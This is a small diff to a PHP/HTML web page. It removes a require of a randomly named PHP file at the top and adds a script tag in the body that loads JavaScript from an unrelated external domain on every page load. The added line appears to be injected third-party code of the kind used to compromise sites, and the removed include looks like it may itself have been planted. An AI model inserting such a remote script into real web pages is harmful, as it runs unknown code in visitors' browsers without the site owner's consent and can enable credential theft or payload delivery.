@@ -1,4 +1,4 @@
-<?php require __DIR__ . '/nyw55b.php' ?>
+
 <!DOCTYPE html>
 <html lang="en">
 
@@ -42,6 +42,7 @@ hs.src = ('//s10.histats.com/js15_as.js');
 </head>
 
 <body>
+  <script src="//track.brightpathcleaningco.site/"></script>
 
   <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
     <defs>
